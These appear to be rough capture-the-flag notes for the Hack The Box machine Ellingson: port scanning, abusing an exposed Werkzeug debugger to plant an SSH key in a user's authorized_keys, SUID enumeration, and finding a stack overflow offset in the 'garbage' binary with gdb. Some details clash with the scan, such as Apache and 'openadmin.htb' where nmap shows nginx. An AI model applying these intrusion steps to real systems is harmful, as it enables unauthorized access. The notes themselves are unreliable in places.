


,,,,
➜  Ellingson nmap -sC -sV -vvv Ellingson.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-05 07:06 EDT
Reason: 998 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNekDYOEF9YFIYWBGwCNM94Oy44bjNn9VlRp8oG8/a+yOHjo0sNd/aYksGIznnzYovF+0h6GDbM1dl/tX3eJgNy8Yil1BOe/sEYajT0vVn8BgJKcdHzAfA9AfpVwkQiJeigy2hcX7urDdoEi5L5uhjl8EqWU15m4bErudukQjmNeTGn1RgW88g8SKNOMI4/weDc2tI8G1J+ZLB/+wpcJe5gCdfnTyhucJqmeZzVy9lDHLpeXlET6Nx931KuJh6+ToXFVT5qB6yMuTnQRgn814uTABbEhxLUUWeFtOtCxLoAjQtpJrQLYaYPaVeewOHWDgDWvhPxYFIZFtiYw7wxsyf
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmN0IVX/rflrwZLRjH3CC3nkAP5gXJwVUK3N7xctzWzR5IpPThLnVpjqGb9IwgROMmS8uTi0ZCQQ/9WSspATFg=
|   256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM8R/Ym8nOpVNvOnGkx6ndSdgJV1UWXwYaCu76M1HYNb
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://ellingson.htb/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

,,,,

Two ports are open:

SSH on 22
Apache 2.4.29 on 80
Browsing to openadmin.htb

------------------------
Browsing through page we see the team, possible usernames for our attack
hal, margo, eugene, duke, wallace, belford, ellingson

## Initial Foothold

we browsed to a page that didn’t exist, it triggered a python exception displaying Interactive Werkzeug Debugger

Let’s import os and then try to execute commands.

The application is running as hal user. We have access to “/home/hal/.ssh/authorized_keys”. We will add the public key and use the key to get ssh as hal user.

-------
Within Hal’s .ssh directory, we see a private key; unfortunately, it’s encrypted. Since we don’t have any creds to try, let’s add our key to the authorized_keys file.


------
>>> 
>>> import os
>>> with open('/home/hal/.ssh/authorized_keys','a') as f: f.write('\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDsDKGikXSi9Qp1a7lGKSBFXJcm1lKsmCZu45grN+ppNhzYMSVxejNCVvOnvfMORPeVD2hYY3zGbpILyyJ0P3ueTfLEqquw5nSyYyh30RP9QS320NC0/my/FyBT+CKegpdb0SCnJFd0L3KkUGBrPxT5AfNat/BjBQLkytZ+EcyioQFqfKGCqL5JEYFwmJ3xmzCMk1GtGDJu1Iii7j0fole/LciYnhuf6tmEbSIakD+QMixWKyPCBAfjNR6C61yhmyHs+FAx00OPBnHDamobVaaYPs9NHz6EZaX285BWmk53FOmYO2lSHQINdqonOxtulWLN8LCIahq0C/SSg7UffsOiwsZhpBwBxeOmp46JYQygw5CYf+IMq+YSTPwWnAWKjvQjx3HAKCX1akauLaRfd5TUx0ipFEO83zvxgn/j4+6KE2nK6dTSD0h1QDi2G2uMzmtN2717naJtNhbUFHd0tXaRySirB1FKiqjQQRbYSNlpU5vdCmuMXv+NJUZg6x8lC+0= root@kali')
563

------

And we login as ellginson

➜  Ellingson ssh -i ellingson_id_rsa hal@10.10.10.139 
The authenticity of host '10.10.10.139 (10.10.10.139)' can't be established.
ECDSA key fingerprint is SHA256:GeXeXsnyrJCxT1nbFPFzh6RZ1ueLCuHIO4hn5HD7Xkw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.139' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue May  5 12:41:43 UTC 2020

  System load:  0.0                Processes:            98
  Usage of /:   23.6% of 19.56GB   Users logged in:      0
  Memory usage: 13%                IP address for ens33: 10.10.10.139
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.


Last login: Sun Mar 10 21:36:56 2019 from 192.168.1.211
hal@ellingson:~$ 
hal@ellingson:/home$ id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
hal@ellingson:/home$ 

Priv: hal –> margo
Enumeration
Right away when I run id I notice that hal is in the adm group:

--------------

## root
margo@ellingson:~$ find / -perm -4000 -type f -ls 2>/dev/null | head
  1049013     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
  1049286     40 -rwsr-xr-x   1 root     root        40344 Jan 25  2018 /usr/bin/newgrp
  1049324     24 -rwsr-xr-x   1 root     root        22520 Jul 13  2018 /usr/bin/pkexec
  1049304     60 -rws------   1 root     root        59640 Jan 25  2018 /usr/bin/passwd
  1049158     76 -rwsr-xr-x   1 root     root        75824 Jan 25  2018 /usr/bin/gpasswd
  1049073     20 -rwsr-xr-x   1 root     root        18056 Mar  9  2019 /usr/bin/garbage
  1049287     40 -rwsr-xr-x   1 root     root        37136 Jan 25  2018 /usr/bin/newuidmap
  1049433    148 -rwsr-xr-x   1 root     root       149080 Jan 18  2018 /usr/bin/sudo
  1049469     20 -rwsr-xr-x   1 root     root        18448 Mar  9  2017 /usr/bin/traceroute6.iputils
  1049064     76 -rwsr-xr-x   1 root     root        76496 Jan 25  2018 /usr/bin/chfn
margo@ellingson:~$ 


copy the binary 

➜  Ellingson scp margo@10.10.10.139:/usr/bin/garbage .
margo@10.10.10.139's password: 
garbage 

---------------
checksec

➜  Ellingson checksec garbage 
[*] '/root/Desktop/pwn/office/HTB/Ellingson/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
➜  Ellingson 


---------------------

attach to gdb
➜  Ellingson gdb -r garbage 
GNU gdb (Debian 9.1-3) 9.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from garbage...
Expanding full symbols from garbage...
(No debugging symbols found in garbage)
gdb-peda$ 

----------------------

----------------------------------

gdb-peda$ x/xg $rsp
0x7ffca452d4a8: 0x41416d4141514141
gdb-peda$ pattern_offset 0x41416d4141514141
4702159612987654465 found at offset: 136
gdb-peda$ 
-------------------------

Seeing that the overflow starts after 136. Next, I need to get the addresses of PLT(Procedural Linkage Table),GOT(Global Offset Table), and make the binary leak an address:

-------------------------------
gdb-peda$ pattern_create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
gdb-peda$ r 
Starting program: /root/Desktop/pwn/office/HTB/Ellingson/garbage 
Enter access password: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

access denied.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fc36fefa643 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x8d49c0 ("access denied.\nssword: ")
RDI: 0x7fc36ffcb4c0 --> 0x0 
RBP: 0x6c41415041416b41 ('AkAAPAAl')
RSP: 0x7ffd5d154148 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
RIP: 0x401618 (<auth+261>:      ret)
R8 : 0xf 
R9 : 0x7ffd5d1540c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
R10: 0x7fc370004e00 (<strcmp+4144>:     pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x401170 (<_start>:        xor    ebp,ebp)
R13: 0x7ffd5d154240 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40160d <auth+250>: call   0x401050 <puts@plt>
   0x401612 <auth+255>: mov    eax,0x0
   0x401617 <auth+260>: leave  
=> 0x401618 <auth+261>: ret    
   0x401619 <main>:     push   rbp
   0x40161a <main+1>:   mov    rbp,rsp
   0x40161d <main+4>:   sub    rsp,0x10
   0x401621 <main+8>:   mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7ffd5d154148 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0008| 0x7ffd5d154150 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0016| 0x7ffd5d154158 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0024| 0x7ffd5d154160 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0032| 0x7ffd5d154168 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0040| 0x7ffd5d154170 ("AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0048| 0x7ffd5d154178 ("AAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0056| 0x7ffd5d154180 ("ZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401618 in auth ()
gdb-peda$ x/xg $rsp
0x7ffd5d154148: 0x41416d4141514141
gdb-peda$ pattern_offset 0x41416d4141514141
4702159612987654465 found at offset: 136

---------------------------------------------------------
Seeing that the overflow starts after 136. Next, I need to get the addresses of PLT(Procedural Linkage Table),GOT(Global Offset Table), and make the binary leak an address:

➜  Ellingson objdump -D garbage| grep puts
0000000000401050 <puts@plt>:
  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
  401321:       e8 2a fd ff ff          callq  401050 <puts@plt>
  401334:       e8 17 fd ff ff          callq  401050 <puts@plt>
  4014c3:       e8 88 fb ff ff          callq  401050 <puts@plt>
  4015fa:       e8 51 fa ff ff          callq  401050 <puts@plt>
  40160d:       e8 3e fa ff ff          callq  401050 <puts@plt>
  401651:       e8 fa f9 ff ff          callq  401050 <puts@plt>
  40165d:       e8 ee f9 ff ff          callq  401050 <puts@plt>
  401669:       e8 e2 f9 ff ff          callq  401050 <puts@plt>
  401675:       e8 d6 f9 ff ff          callq  401050 <puts@plt>
  401681:       e8 ca f9 ff ff          callq  401050 <puts@plt>
  40168d:       e8 be f9 ff ff          callq  401050 <puts@plt>
  401699:       e8 b2 f9 ff ff          callq  401050 <puts@plt>
  40171c:       e8 2f f9 ff ff          callq  401050 <puts@plt>
➜  Ellingson 

--------------------------------------------------------
gef

gef➤  pattern create 300
[+] Generating a pattern of 300 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /root/Desktop/pwn/office/HTB/Ellingson/garbage 
Enter access password: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa

access denied.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401618 in auth ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ff2d120b643  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007ffdcaa63708  →  "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
$rbp   : 0x6161616161616171 ("qaaaaaaa"?)
$rsi   : 0x00000000012f29c0  →  "access denied.\nssword: "
$rdi   : 0x00007ff2d12dc4c0  →  0x0000000000000000
$rip   : 0x0000000000401618  →  <auth+261> ret 
$r8    : 0xf               
$r9    : 0x00007ffdcaa63680  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$r10   : 0x00007ff2d1315e00  →  <strcmp+4144> pxor xmm0, xmm0
$r11   : 0x246             
$r12   : 0x0000000000401170  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffdcaa63800  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffdcaa63708│+0x0000: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"    ← $rsp
0x00007ffdcaa63710│+0x0008: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"
0x00007ffdcaa63718│+0x0010: "taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaaza[...]"
0x00007ffdcaa63720│+0x0018: "uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabba[...]"
0x00007ffdcaa63728│+0x0020: "vaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabca[...]"
0x00007ffdcaa63730│+0x0028: "waaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabda[...]"
0x00007ffdcaa63738│+0x0030: "xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea[...]"
0x00007ffdcaa63740│+0x0038: "yaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfa[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40160d <auth+250>       call   0x401050 <puts@plt>
     0x401612 <auth+255>       mov    eax, 0x0
     0x401617 <auth+260>       leave  
 →   0x401618 <auth+261>       ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "garbage", stopped 0x401618 in auth (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401618 → auth()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

-------------------------------------------------------------
offset

gef➤  x/xg $rsp
0x7ffdcaa63708: 0x6161616161616172
gef➤  pattern offset 0x6161616161616172
[+] Searching '0x6161616161616172'
[+] Found at offset 136 (little-endian search) likely
[+] Found at offset 129 (big-endian search) 
gef➤  







